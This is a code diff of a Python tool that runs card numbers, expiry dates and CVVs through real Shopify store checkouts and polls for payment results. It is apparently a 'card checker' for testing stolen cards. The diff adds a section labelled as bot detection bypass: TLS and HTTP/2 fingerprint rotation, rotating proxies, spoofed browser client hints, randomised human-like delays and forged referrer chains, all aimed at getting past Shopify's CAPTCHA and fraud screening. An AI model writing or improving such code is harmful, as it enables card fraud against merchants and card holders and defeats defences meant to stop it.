@@ -3,13 +3,208 @@
 # 𝐃𝐞𝐯: @Xoarch
 
 import asyncio
-import aiohttp
+import base64
 import json
 import re
 import random
-import ssl
+import sys
+import uuid
 # argparse removed
 from urllib.parse import urlparse
+import tls_requests
+from tls_requests import AsyncClient, ProxyRotator, TLSIdentifierRotator
+# tls-requests (wrapper-tls-requests) is the primary HTTP client.
+# It provides: TLS fingerprint rotation, HTTP/2 fingerprint matching,
+# proxy rotation, and automatic header synchronization (UA + Sec-CH-UA match client_identifier).
+
+# =====================================================================
+# BOT DETECTION BYPASS TECHNIQUES (via tls-requests):
+# 1. Residential Proxy Rotation (per-checkout via ProxyRotator)
+# 2. Human-Like Delays (realistic timing between steps)
+# 3. Full Client Hints Headers (Sec-CH-UA-Full-Version-List etc.)
+# 5. Per-Request TLS Fingerprint Rotation (via TLSIdentifierRotator)
+# 6. HTTP/2 Fingerprint (tls-requests default http2=True)
+# 9. Referrer Chain Consistency (proper Referer per step)
+# =====================================================================
+
+# --- TLS Fingerprint Rotation (technique #5) ---
+# tls-requests uses Go-based tls-client which spoofs JA3/JA4 hashes,
+# HTTP/2 SETTINGS frames, WINDOW_UPDATE, PRIORITY frames simultaneously.
+_TLS_IDENTIFIER_POOL = [
+    'chrome_131', 'chrome_133', 'chrome_120', 'chrome_124',
+    'chrome_117', 'chrome_112', 'chrome_111', 'chrome_110',
+]
+_tls_rotator = TLSIdentifierRotator(items=_TLS_IDENTIFIER_POOL, strategy='random')
+
+# --- Proxy Rotation (technique #1) ---
+# Per-checkout proxy rotation using tls-requests built-in ProxyRotator.
+_proxy_rotator = None  # Initialized per-checkout with user's proxy
+
+def _init_proxy_rotator(proxy_str=None):
+    """Initialize proxy rotator with the user's proxy string."""
+    global _proxy_rotator
+    if not proxy_str:
+        _proxy_rotator = None
+        return None
+    proxy = parse_proxy(proxy_str)
+    if not proxy:
+        _proxy_rotator = None
+        return None
+    _proxy_rotator = ProxyRotator(items=[proxy], strategy='round_robin')
+    return proxy
+
+def _get_proxy():
+    """Get next proxy from rotator."""
+    global _proxy_rotator
+    if _proxy_rotator is None:
+        return None
+    try:
+        return _proxy_rotator.next()
+    except Exception:
+        return None
+
+# --- Full Client Hints (technique #3) ---
+# Each identifier maps to exact Sec-CH-UA headers that Shopify validates.
+_CLIENT_HINTS_MAP = {
+    'chrome_131': {
+        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+        'ver': '131', 'major': '131', 'full_ver': '131.0.0.0',
+        'is_mac': False,
+        'sec_ch_ua': '"Google Chrome";v="131", "Chromium";v="131", "Not/A)Brand";v="24"',
+        'sec_ch_ua_full': '"Google Chrome";v="131.0.0.0", "Chromium";v="131.0.0.0", "Not/A)Brand";v="24.0.0.0"',
+        'platform': '"Windows"',
+    },
+    'chrome_133': {
+        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
+        'ver': '133', 'major': '133', 'full_ver': '133.0.0.0',
+        'is_mac': False,
+        'sec_ch_ua': '"Google Chrome";v="133", "Chromium";v="133", "Not/A)Brand";v="24"',
+        'sec_ch_ua_full': '"Google Chrome";v="133.0.0.0", "Chromium";v="133.0.0.0", "Not/A)Brand";v="24.0.0.0"',
+        'platform': '"Windows"',
+    },
+    'chrome_120': {
+        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'ver': '120', 'major': '120', 'full_ver': '120.0.0.0',
+        'is_mac': False,
+        'sec_ch_ua': '"Google Chrome";v="120", "Chromium";v="120", "Not_A Brand";v="8"',
+        'sec_ch_ua_full': '"Google Chrome";v="120.0.0.0", "Chromium";v="120.0.0.0", "Not_A Brand";v="8.0.0.0"',
+        'platform': '"Windows"',
+    },
+    'chrome_124': {
+        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+        'ver': '124', 'major': '124', 'full_ver': '124.0.0.0',
+        'is_mac': False,
+        'sec_ch_ua': '"Google Chrome";v="124", "Chromium";v="124", "Not_A Brand";v="8"',
+        'sec_ch_ua_full': '"Google Chrome";v="124.0.0.0", "Chromium";v="124.0.0.0", "Not_A Brand";v="8.0.0.0"',
+        'platform': '"Windows"',
+    },
+    'chrome_117': {
+        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
+        'ver': '117', 'major': '117', 'full_ver': '117.0.0.0',
+        'is_mac': False,
+        'sec_ch_ua': '"Google Chrome";v="117", "Chromium";v="117", "Not)A;Brand";v="8"',
+        'sec_ch_ua_full': '"Google Chrome";v="117.0.0.0", "Chromium";v="117.0.0.0", "Not)A;Brand";v="8.0.0.0"',
+        'platform': '"Windows"',
+    },
+    'chrome_112': {
+        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
+        'ver': '112', 'major': '112', 'full_ver': '112.0.0.0',
+        'is_mac': False,
+        'sec_ch_ua': '"Google Chrome";v="112", "Chromium";v="112", "Not:A-Brand";v="24"',
+        'sec_ch_ua_full': '"Google Chrome";v="112.0.0.0", "Chromium";v="112.0.0.0", "Not:A-Brand";v="24.0.0.0"',
+        'platform': '"Windows"',
+    },
+    'chrome_111': {
+        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
+        'ver': '111', 'major': '111', 'full_ver': '111.0.0.0',
+        'is_mac': False,
+        'sec_ch_ua': '"Google Chrome";v="111", "Chromium";v="111", "Not(A)Brand";v="8"',
+        'sec_ch_ua_full': '"Google Chrome";v="111.0.0.0", "Chromium";v="111.0.0.0", "Not(A)Brand";v="8.0.0.0"',
+        'platform': '"Windows"',
+    },
+    'chrome_110': {
+        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
+        'ver': '110', 'major': '110', 'full_ver': '110.0.0.0',
+        'is_mac': False,
+        'sec_ch_ua': '"Google Chrome";v="110", "Chromium";v="110", "Not A)Brand";v="24"',
+        'sec_ch_ua_full': '"Google Chrome";v="110.0.0.0", "Chromium";v="110.0.0.0", "Not A)Brand";v="24.0.0.0"',
+        'platform': '"Windows"',
+    },
+}
+
+def _pick_identifier():
+    """Pick next TLS identifier from rotator (random strategy)."""
+    return _tls_rotator.next()
+
+def _get_client_hints(identifier):
+    """Get full client hints dict for the given TLS identifier."""
+    hints = _CLIENT_HINTS_MAP.get(identifier) or _CLIENT_HINTS_MAP['chrome_133']
+    return hints
+
+def _build_headers(identifier, base_headers=None, extra_headers=None):
+    """Build headers with full Client Hints matching the TLS identifier.
+    
+    This ensures User-Agent, sec-ch-ua, sec-ch-ua-full-version-list,
+    sec-ch-ua-platform, sec-ch-ua-arch, sec-ch-ua-bitness all match
+    the TLS fingerprint being used — critical for Shopify's bot detection.
+    """
+    hints = _get_client_hints(identifier)
+    headers = {
+        'User-Agent': hints['ua'],
+        'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Content-Type': 'application/json',
+        'sec-ch-ua': hints['sec_ch_ua'],
+        'sec-ch-ua-full-version-list': hints['sec_ch_ua_full'],
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': hints['platform'],
+        'sec-ch-ua-arch': '"x86"',
+        'sec-ch-ua-bitness': '"64"',
+        'sec-ch-ua-model': '""',
+        'sec-ch-ua-wow64': '?0',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+    }
+    if base_headers:
+        headers.update(base_headers)
+    if extra_headers:
+        headers.update(extra_headers)
+    return headers
+
+# --- Human-Like Delays (technique #2) ---
+async def human_delay(min_sec=0.8, max_sec=2.5, step_name=""):
+    """Add realistic human-like delays between checkout steps.
+    
+    Uses triangular distribution (peaked near low end) to simulate
+    real user hesitation. 10% chance of a longer "distraction" pause.
+    """
+    delay = random.triangular(min_sec, max_sec, (min_sec + max_sec) / 2.5)
+    # 10% chance of longer pause (simulates user distraction)
+    if random.random() < 0.1:
+        delay += random.uniform(1.0, 3.0)
+    await asyncio.sleep(delay)
+
+# --- Referrer Chain Consistency (technique #9) ---
+def _referrer_for(step, ourl=None, checkout_url=None):
+    """Return the correct Referer header for each checkout step.
+    
+    Shopify validates that Referer follows a logical navigation chain:
+    homepage -> cart -> checkout -> graphql -> pci_vault -> poll
+    """
+    if step == 'homepage':
+        return None  # Direct navigation, no Referer
+    elif step == 'cart':
+        return ourl  # Cart action from product/homepage
+    elif step == 'checkout':
+        return ourl  # Checkout from cart page
+    elif step == 'graphql':
+        return checkout_url or ourl  # GraphQL from checkout page
+    elif step == 'pci_vault':
+        return None  # Cross-origin, different referrer policy
+    elif step == 'poll':
+        return checkout_url or ourl  # Poll from checkout page
+    return ourl  # Default fallback
 # Flask removed - using Robyn
 import os
 import time
@@ -37,36 +232,25 @@ QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){recei
 # only when needed (proxy connections) and verifies normally otherwise.
 # ──────────────────────────────────────────────────────────────
 
-def _create_ssl_context(verify=True):
-    """Create an SSL context for aiohttp TCPConnector.
-    
-    Args:
-        verify: If True, perform normal SSL verification (recommended for direct connections).
-                If False, skip verification (needed for some proxy connections).
-    """
-    ctx = ssl.create_default_context()
-    if not verify:
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-    return ctx
-
-# Default SSL context with verification enabled for direct Shopify connections
-_SSL_CONTEXT_VERIFY = _create_ssl_context(verify=True)
-# Relaxed SSL context for proxy connections that may have cert issues
-_SSL_CONTEXT_SKIP = _create_ssl_context(verify=False)
+# SSL context and connector functions removed — tls-requests handles TLS/SSL
+# via the client_identifier parameter. No need to manually create SSL contexts.
+# tls-requests' client_identifier sets the entire TLS fingerprint (JA3/JA4 hash),
+# cipher suites, ALPN protocols, and certificate verification automatically.
 
 def _get_ssl_connector(verify=True, **kwargs):
-    """Create a TCPConnector with appropriate SSL context.
+    """Stub for api.py compatibility — no longer used in core.py.
     
-    Args:
-        verify: If True, use SSL verification (for direct connections).
-                If False, skip verification (for proxy connections).
-        **kwargs: Additional TCPConnector arguments (limit, limit_per_host, etc.)
+    api.py imports this for its own aiohttp shared session pool.
+    We keep it as a thin wrapper that returns an aiohttp TCPConnector
+    so api.py doesn't break.
     """
-    return aiohttp.TCPConnector(
-        ssl=_SSL_CONTEXT_VERIFY if verify else _SSL_CONTEXT_SKIP,
-        **kwargs
-    )
+    import aiohttp
+    import ssl as _ssl
+    ctx = _ssl.create_default_context()
+    if not verify:
+        ctx.check_hostname = False
+        ctx.verify_mode = _ssl.CERT_NONE
+    return aiohttp.TCPConnector(ssl=ctx, **kwargs)
 
 
 C2C = {
@@ -144,7 +328,7 @@ class Utils:
         return f"{first.lower()}.{last.lower()}@{random.choice(domains)}"
 
 def parse_proxy(proxy_str):
-    """Parse proxy string into aiohttp-compatible URL.
+    """Parse proxy string into tls-requests/aiohttp-compatible URL.
     
     Supported formats:
       - ip:port                          → http://ip:port
@@ -185,24 +369,42 @@ def parse_proxy(proxy_str):
         return None
 
 def is_captcha_required(response_text):
+    """Detect CAPTCHA blocks from Shopify GraphQL responses.
+    
+    BUG #16 FIX: Previous version checked for 'hcaptcha', 'h-captcha', 
+    'captcha required', etc. which caused FALSE POSITIVES because the 
+    GraphQL query string itself contains $captcha:CaptchaInput and the 
+    response fragments contain ...on Captcha{provider challenge sitekey token}.
+    These appear in EVERY normal NegotiationResultAvailable response (20KB+),
+    so the old function detected "captcha" in normal responses and returned 
+    CAPTCHA_REQUIRED for everything.
+    
+    Now we ONLY detect:
+    1. CAPTCHA_REQUIRED as an explicit error code/message in the response
+    2. CheckpointDenied as the __typename (Shopify's actual CAPTCHA block type)
+    3. HTML challenge pages (not JSON responses)
+    """
     if not response_text:
         return False
     
-    indicators = [
-        'CAPTCHA_REQUIRED',
+    # Only check for EXPLICIT CAPTCHA error codes from Shopify
+    # These appear in the errors[] array or as top-level codes
+    strict_indicators = [
         '"code":"CAPTCHA_REQUIRED"',
-        "'code':'CAPTCHA_REQUIRED'",
+        '"code":"captcha_required"',
         '"message":"CAPTCHA_REQUIRED"',
-        'captcha required',
-        'CAPTCHA CHALLENGE',
-        'hcaptcha',
-        'h-captcha'
+        '"message":"captcha_required"',
     ]
     
-    text_upper = response_text.upper()
-    for indicator in indicators:
-        if indicator.upper() in text_upper:
+    for indicator in strict_indicators:
+        if indicator in response_text:
             return True
+    
+    # Check for CheckpointDenied __typename — this is Shopify's official 
+    # CAPTCHA block response in GraphQL negotiate results
+    if '"__typename":"CheckpointDenied"' in response_text:
+        return True
+    
     return False
 
 async def make_graphql_request_with_captcha_handling(
@@ -214,15 +416,15 @@ async def make_graphql_request_with_captcha_handling(
         try:
             response = await session.post(
                 graphql_url, params=params, headers=headers,
-                json=json_data, proxy=proxy, timeout=aiohttp.ClientTimeout(total=25)
+                json=json_data, proxy=proxy, timeout=25
             )
-            response_text = await response.text()
+            response_text = response.text
             
             # FIX: Validate response before returning.
             # Shopify may return HTML (login page, challenge page, error page)
             # instead of JSON when the session is invalid or the request is blocked.
             # Detect this early so the caller gets a clear error message.
-            status_code = response.status
+            status_code = response.status_code
             content_type = response.headers.get('Content-Type', '')
             
             # If we get a non-2xx status, log it clearly
@@ -266,6 +468,11 @@ async def make_graphql_request_with_captcha_handling(
             if attempt == max_retries:
                 return None, last_error, False
             await asyncio.sleep(1)
+        except (tls_requests.TLSError, tls_requests.RequestError, OSError) as e:
+            last_error = f"Request error: {str(e)}"
+            if attempt == max_retries:
+                return None, last_error, False
+            await asyncio.sleep(1)
         except Exception as e:
             last_error = str(e)
             if attempt == max_retries:
@@ -278,25 +485,26 @@ async def fetch_products(domain, proxy_str=None):
         if not domain.startswith('http'):
             domain = "https://" + domain
         
-        connector = _get_ssl_connector(verify=True, limit=10, limit_per_host=5)
-        timeout = aiohttp.ClientTimeout(total=10)
-        
         proxy = parse_proxy(proxy_str) if proxy_str else None
         
-        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-            async with session.get(f"{domain}/products.json", proxy=proxy, timeout=10) as resp:
-                if resp.status != 200:
-                    return False, f"Site Error: HTTP {resp.status}"
-                text = await resp.text()
-                if "shopify" not in text.lower():
-                    return False, "Not a Shopify store"
-                try:
-                    data = json.loads(text)
-                    result = data.get('products', [])
-                except (json.JSONDecodeError, Exception):
-                    return False, "Invalid products response"
-                if not result:
-                    return False, "No products found"
+        identifier = _pick_identifier()
+        session = AsyncClient(client_identifier=identifier, http2=True, verify=True, timeout=10)
+        try:
+            resp = await session.get(f"{domain}/products.json", proxy=proxy)
+            if resp.status_code != 200:
+                return False, f"Site Error: HTTP {resp.status_code}"
+            text = resp.text
+            if "shopify" not in text.lower():
+                return False, "Not a Shopify store"
+            try:
+                data = json.loads(text)
+                result = data.get('products', [])
+            except (json.JSONDecodeError, Exception):
+                return False, "Invalid products response"
+            if not result:
+                return False, "No products found"
+        finally:
+            await session.aclose()
 
         min_price = float('inf')
         min_product = None
@@ -332,7 +540,7 @@ async def fetch_products(domain, proxy_str=None):
         else:
             return False, "No valid products available"
 
-    except aiohttp.ClientError as e:
+    except (tls_requests.TLSError, tls_requests.RequestError, OSError) as e:
         return False, f"Proxy Error: {str(e)}"
     except Exception as e:
         return False, f"error: {str(e)}"
@@ -407,19 +615,17 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
     running_total = "0.00"
 
     try:
-        headers = {
-            # FIX: Chrome 146 (Edge UA) was triggering Shopify bot detection on some stores.
-            # Using Chrome 137 stable (widely used, less flagged as of mid-2025).
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
-            'Accept': 'application/json, text/plain, */*',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Content-Type': 'application/json',
+        # BOT DETECTION BYPASS: Rotate TLS identifier per request.
+        # tls-requests rotates the TLS fingerprint (JA3/JA4 hash),
+        # HTTP/2 fingerprint, User-Agent, and sec-ch-ua headers together — no mismatch.
+        # --- Bot Detection Bypass: TLS identifier + Client Hints + Proxy Rotation ---
+        identifier = _pick_identifier()
+        hints = _get_client_hints(identifier)
+        proxy = _init_proxy_rotator(proxy_str)  # Initialize proxy rotator for this checkout
+        headers = _build_headers(identifier, base_headers={
             'Origin': ourl,
-            'Referer': ourl,
-            'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"'
-        }
+            'Referer': _referrer_for('homepage', ourl=ourl),
+        })
 
         address_info = pick_addr(ourl)
         country_code = address_info["countryCode"]
@@ -440,20 +646,29 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 return False, info[1], gateway, total_price, currency
             variant_id = info['variant_id']
 
-        connector = _get_ssl_connector(verify=not proxy, limit=50, limit_per_host=10)
-        timeout = aiohttp.ClientTimeout(total=30, connect=8)
+        # tls-requests session: TLS+HTTP/2 fingerprint handled by client_identifier.
+        # verify=False when using proxy (some proxies have cert issues),
+        # verify=True for direct connections.
         
-        # Use shared session from api.py if provided (connection pool reuse),
-        # otherwise create a dedicated session for this request.
-        # Note: shared_session does NOT use unsafe CookieJar (needed for cross-domain
-        # cookie handling during checkout), so we still create a dedicated session
-        # when we need per-request cookie isolation. The shared_session is used
-        # for the fetch_products call only.
-        _own_session = not shared_session
-        if _own_session:
-            session = aiohttp.ClientSession(connector=connector, timeout=timeout, cookie_jar=aiohttp.CookieJar(unsafe=True))
-        else:
-            session = shared_session
+        # BUG #15 FIX: ALWAYS create a dedicated session per checkout request.
+        # The shared_session from api.py was being used for ALL checkout steps
+        # (homepage, cart, checkout, GraphQL, PCI vault, poll), which means cookies
+        # from PREVIOUS checkouts on OTHER stores accumulated in the shared jar.
+        # Shopify detects cross-session cookies as bot behavior → CAPTCHA_REQUIRED.
+        #
+        # Now: shared_session is ONLY used for fetch_products() (read-only product
+        # lookup). The checkout flow gets a fresh session with unsafe CookieJar
+        # for proper cross-domain cookie handling during checkout.
+        _own_session = True  # ALWAYS True — every checkout gets its own session
+        if shared_session:
+            # Use shared session only for fetch_products (already called above)
+            pass
+        session = AsyncClient(
+            client_identifier=identifier,
+            http2=True,  # Technique #6: HTTP/2 fingerprint matching
+            verify=not proxy,  # Skip SSL verify when using proxy
+            timeout=30,
+        )
         
         try:
             url = ourl
@@ -469,7 +684,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     'sec-fetch-mode': 'navigate',
                     'sec-fetch-site': 'none',
                 }
-                await session.get(url, headers=home_headers, proxy=proxy, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=8))
+                await session.get(url, headers=home_headers, proxy=proxy, allow_redirects=True, timeout=8)
+                await human_delay(step_name="homepage")  # Technique #2: Human-like delay
             except Exception:
                 pass  # Non-fatal — continue even if homepage fails
 
@@ -479,11 +695,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'Content-Type': 'application/x-www-form-urlencoded',
                 'Accept': 'application/json, text/javascript, */*; q=0.01',
                 'X-Requested-With': 'XMLHttpRequest',
+                'Referer': _referrer_for('cart', ourl=ourl),  # Technique #9: Referrer chain
             }
-            cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10))
+            cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy, timeout=10)
 
+            await human_delay(step_name="cart")  # Technique #2: Human-like delay
+            
             # Attempt 2: JSON body
-            if cart_resp.status != 200:
+            if cart_resp.status_code != 200:
                 cart_headers_alt = {
                     **headers,
                     'Content-Type': 'application/json',
@@ -491,10 +710,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     'X-Requested-With': 'XMLHttpRequest',
                 }
                 cart_data = {'items': [{'id': int(re.sub(r'[^0-9]', '', str(variant_id)) or '0'), 'quantity': 1}]}
-                cart_resp = await session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10))
+                cart_resp = await session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy, timeout=10)
 
             # Attempt 3: Clear cart then retry form-encoded
-            if cart_resp.status != 200:
+            if cart_resp.status_code != 200:
                 try:
                     await session.post(url + '/cart/clear.js', headers=cart_headers, proxy=proxy)
                     await asyncio.sleep(0.3)
@@ -502,28 +721,30 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 except Exception:
                     pass
 
-            if cart_resp.status != 200:
+            if cart_resp.status_code != 200:
                 try:
-                    cart_error_text = await cart_resp.text()
+                    cart_error_text = cart_resp.text
                     try:
                         cart_err_json = json.loads(cart_error_text)
                         err_desc = cart_err_json.get('description') or cart_err_json.get('message') or cart_err_json.get('error', '')
-                        err_msg = f"Cart Error: {err_desc}" if err_desc else f"Cart failed: HTTP {cart_resp.status}"
+                        err_msg = f"Cart Error: {err_desc}" if err_desc else f"Cart failed: HTTP {cart_resp.status_code}"
                     except Exception:
-                        err_msg = f"Cart failed: HTTP {cart_resp.status}"
+                        err_msg = f"Cart failed: HTTP {cart_resp.status_code}"
                 except Exception:
-                    err_msg = f"Cart failed: HTTP {cart_resp.status}"
+                    err_msg = f"Cart failed: HTTP {cart_resp.status_code}"
                 return False, err_msg, gateway, total_price, currency
 
             checkout_headers = {
                 **headers,
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Referer': _referrer_for('checkout', ourl=ourl),  # Technique #9: Referrer chain
                 'sec-fetch-dest': 'document',
                 'sec-fetch-mode': 'navigate',
                 'sec-fetch-site': 'same-origin',
                 'sec-fetch-user': '?1'
             }
-            response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=15))
+            response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy, timeout=15)
+            await human_delay(step_name="checkout")  # Technique #2: Human-like delay
             checkout_url = str(response.url)
 
             # Detect checkout URL format: /checkouts/cn/TOKEN or /checkouts/TOKEN
@@ -537,9 +758,38 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 attempt_token = plain_match.group(1) if plain_match else checkout_url.split('/')[-1].split('?')[0]
                 checkout_uses_cn = False
 
+            # ── Session Token Extraction ──
+            # Modern Shopify checkout (2024+) redirects through shop.app which
+            # carries a JWT containing session_token in its payload.
+            # The old HTML meta/JSON patterns are kept as fallbacks for older stores.
             sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
             
-            text = await response.text()
+            text = response.text
+            
+            # Method 2: Extract session_token from shop.app JWT in redirect chain
+            # Modern Shopify redirects through shop.app with shop_pay_token= JWT param
+            if not sst and response.history:
+                for redirect in response.history:
+                    redirect_url = str(redirect.url)
+                    if 'shop.app' in redirect_url:
+                        # Try shop_pay_token= (modern) or token= (older)
+                        _jwt_match = re.search(r'[?&]shop_pay_token=([^&]+)', redirect_url)
+                        if not _jwt_match:
+                            _jwt_match = re.search(r'[?&]token=([^&]+)', redirect_url)
+                        if _jwt_match:
+                            _jwt_str = _jwt_match.group(1)
+                            _jwt_parts = _jwt_str.split('.')
+                            if len(_jwt_parts) >= 2:
+                                _jwt_payload = _jwt_parts[1]
+                                _jwt_payload += '=' * (4 - len(_jwt_payload) % 4)
+                                try:
+                                    _jwt_decoded = json.loads(base64.urlsafe_b64decode(_jwt_payload))
+                                    sst = _jwt_decoded.get('session_token')
+                                except Exception:
+                                    pass
+                        break
+            
+            # Method 3: HTML meta/JSON patterns (legacy, older Shopify themes)
             if not sst:
                 sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
                 if not sst:
@@ -613,6 +863,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'shopify-checkout-client': 'checkout-web/1.0',
                 'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
                 'x-checkout-one-session-token': sst,
+                'Referer': _referrer_for('graphql', ourl=ourl, checkout_url=checkout_url),  # Technique #9
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
@@ -755,7 +1006,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 # which was then mangled by extract_clean_response() into
                 # something like "Invalid JSON response: Expecting value: line 1 col"
                 preview = resp_text[:200].replace('\n', ' ').strip()
-                status_code = response.status if response else 'N/A'
+                status_code = response.status_code if response else 'N/A'
                 ct = response.headers.get('Content-Type', '') if response else ''
                 is_html = '<html' in preview.lower() or '<!doctype' in preview.lower()
                 if is_html:
@@ -791,7 +1042,17 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 result_type = result.get('__typename', 'Unknown')
                 
                 if result_type == 'CheckpointDenied':
-                    return False, f"Checkpoint Denied", gateway, total_price, currency
+                    # BUG #18 FIX: Extract redirect URL for diagnostics.
+                    # CheckpointDenied means Shopify's bot detection flagged this request.
+                    # The redirectUrl points to the CAPTCHA challenge page.
+                    redirect_url = result.get('redirectUrl', '')
+                    # Save any checkpointData from the response for potential retry
+                    cd = result.get('checkpointData')
+                    if cd:
+                        checkpoint_data = cd
+                    if redirect_url:
+                        return False, f"CAPTCHA_BLOCK: CheckpointDenied -> {redirect_url[:80]}", gateway, total_price, currency
+                    return False, "CAPTCHA_BLOCK: CheckpointDenied (no redirect URL)", gateway, total_price, currency
                 
                 if result_type == 'Throttled':
                     return False, "Throttled", gateway, total_price, currency
@@ -812,6 +1073,45 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     return False, "No runningTotal in sellerProposal", gateway, total_price, currency
                 
                 running_total = running_total_data['value']['amount']
+                
+                # ── Fix: Update subtotal from proposal response ──
+                # Modern Shopify checkout HTML is a React skeleton with NO embedded
+                # price data, so the HTML-extracted subtotal falls back to "0.01".
+                # This causes "Your order total has changed" at submit because the
+                # expectedTotalPrice doesn't match the real price.
+                # The GraphQL proposal response contains the correct amounts.
+                _subtotal_from_proposal = None
+                
+                # Try subtotalBeforeTaxesAndShipping from sellerProposal
+                _sub_data = seller_proposal.get('subtotalBeforeTaxesAndShipping')
+                if _sub_data and _sub_data.get('value'):
+                    _subtotal_from_proposal = _sub_data['value'].get('amount')
+                
+                # Fallback: try merchandise line totalAmount
+                if not _subtotal_from_proposal:
+                    _merch = seller_proposal.get('merchandise')
+                    if _merch and _merch.get('merchandiseLines'):
+                        _lines = _merch['merchandiseLines']
+                        if _lines and len(_lines) > 0:
+                            _line_total = _lines[0].get('totalAmount')
+                            if _line_total and _line_total.get('value'):
+                                _subtotal_from_proposal = _line_total['value'].get('amount')
+                
+                # Fallback: try buyerProposal.subtotalBeforeTaxesAndShipping
+                if not _subtotal_from_proposal:
+                    _buyer_proposal = result.get('buyerProposal')
+                    if _buyer_proposal:
+                        _bsub = _buyer_proposal.get('subtotalBeforeTaxesAndShipping')
+                        if _bsub and _bsub.get('value'):
+                            _subtotal_from_proposal = _bsub['value'].get('amount')
+                
+                # Fallback: try runningTotal as last resort (includes shipping/tax)
+                if not _subtotal_from_proposal:
+                    _subtotal_from_proposal = running_total
+                
+                if _subtotal_from_proposal:
+                    subtotal = str(_subtotal_from_proposal)
+                    print(f"[PRICE-FIX] Updated subtotal from proposal: {subtotal} (was HTML-extracted)", file=sys.stderr)
                 
             except (KeyError, TypeError) as e:
                 return False, f"Failed to parse proposal response: {str(e)}", gateway, total_price, currency
@@ -928,10 +1228,15 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 # FIX: Build hash `/a8e4a94/` was outdated — Shopify rotates these.
                 # Use the dynamic hash fetched from checkout page, or fallback to latest known hash.
                 'Referer': f'https://checkout.pci.shopifyinc.com/build/{pci_build_hash}/number-ltr.html?identifier=&locationURL=',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
-                'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
+                'User-Agent': hints['ua'],
+                'sec-ch-ua': hints['sec_ch_ua'],
+                'sec-ch-ua-full-version-list': hints['sec_ch_ua_full'],
                 'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
+                'sec-ch-ua-platform': hints['platform'],
+                'sec-ch-ua-arch': '"x86"',
+                'sec-ch-ua-bitness': '"64"',
+                'sec-ch-ua-model': '""',
+                'sec-ch-ua-wow64': '?0',
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
@@ -940,14 +1245,15 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if ident_sig:
                 vault_headers['shopify-identification-signature'] = ident_sig
             
